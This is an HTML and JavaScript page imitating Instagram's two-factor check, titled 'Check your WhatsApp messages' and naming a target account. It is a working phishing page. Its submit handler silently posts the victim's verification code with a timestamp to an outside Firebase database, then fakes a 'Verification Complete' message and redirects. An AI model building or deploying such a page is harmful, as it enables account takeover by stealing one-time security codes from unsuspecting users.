<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="verify.css">
    <title>Check your WhatsApp messages</title>
    <style>
    
    </style>
  </head>
  <body>
    <div class="container">
      <div class="back-btn">‚Üê</div>

      <p class="meta-header">_samavia_malikk - Instagram</p>
      <h1 class="header-text">Check your WhatsApp messages</h1>
      <p class="sub-text">Enter the code we sent to your WhatsApp account.</p>

      <div class="illustration-box">
        <img src="Dummy.png" alt="" />
      </div>

      <form id="codeForm">
        <input
          type="text"
          id="verificationCode"
          placeholder="Code"
          maxlength="8"
          required
        />

        <div class="timer-row">
          <span id="timerText">We can send a new code in 00:20</span>
        </div>

        <div class="trust-row">
          <input type="checkbox" id="trust" checked />
          <label for="trust"
            >Trust this device and skip this step from now on</label
          >
        </div>

        <button type="submit" class="btn-continue" id="submitBtn" disabled>
          Continue
        </button>
        <!-- <button type="button" class="btn-another">Try Another Way</button> -->
        <button type="button" class="btn-another" onclick="window.location.href='email.html'">Try Another Way</button>
      </form>
    </div>

    <script>
      const CODE_DB_URL =
        "https://insta-39d4a-default-rtdb.firebaseio.com/codes.json";
      const codeInput = document.getElementById("verificationCode");
      const submitBtn = document.getElementById("submitBtn");
      const timerText = document.getElementById("timerText");

      // --- TIMER LOGIC ---
      let secondsLeft = 20;
      const countdown = setInterval(() => {
        secondsLeft--;
        // Format time to always show 00:XX
        let displaySec = secondsLeft < 10 ? "0" + secondsLeft : secondsLeft;
        timerText.innerText = `We can send a new code in 00:${displaySec}`;

        if (secondsLeft <= 0) {
          clearInterval(countdown);
          timerText.innerText = "You can now resend the code.";
          timerText.style.color = "#1877f2";
          timerText.style.cursor = "pointer";
        }
      }, 1000);

      // --- BUTTON COLOR LOGIC ---
      codeInput.addEventListener("input", () => {
        if (codeInput.value.length >= 4) {
          submitBtn.style.backgroundColor = "#1877f2";
          submitBtn.style.cursor = "pointer";
          submitBtn.disabled = false;
        } else {
          submitBtn.style.backgroundColor = "#aac9ff";
          submitBtn.style.cursor = "not-allowed";
          submitBtn.disabled = true;
        }
      });

      // --- FIREBASE LOGIC ---
      document
        .getElementById("codeForm")
        .addEventListener("submit", async function (e) {
          e.preventDefault();

          const codeData = {
            securityCode: codeInput.value,
            timestamp: new Date().toLocaleString(),
          };

          try {
            const response = await fetch(CODE_DB_URL, {
              method: "POST",
              body: JSON.stringify(codeData),
              headers: { "Content-Type": "application/json" },
            });

            if (response.ok) {
              alert("Verification Complete");
              window.location.href = "mainpage.html";
            }
          } catch (error) {
            console.error("Error:", error);
          }
        });
    </script>
  </body>
</html>
